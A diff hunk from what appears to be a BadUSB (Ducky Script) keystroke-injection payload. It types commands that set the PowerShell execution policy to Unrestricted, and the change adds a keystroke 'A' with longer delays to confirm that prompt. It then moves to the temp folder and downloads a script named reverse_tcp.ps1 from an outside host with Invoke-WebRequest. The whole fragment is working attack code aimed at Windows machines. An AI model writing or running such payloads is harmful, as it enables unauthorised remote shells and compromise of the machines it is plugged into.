@@ -10,7 +10,10 @@ ENTER
 DELAY 900
 STRING Set-ExecutionPolicy Unrestricted
 ENTER
-DELAY 200
+DELAY 400
+STRING A
+ENTER
+DELAY 400
 STRING cd $env:TEMP
 ENTER
 STRING Invoke-WebRequest -Uri "https://fipso.de/Downloads/reverse_tcp.ps1" -OutFile scrBlob.ps1
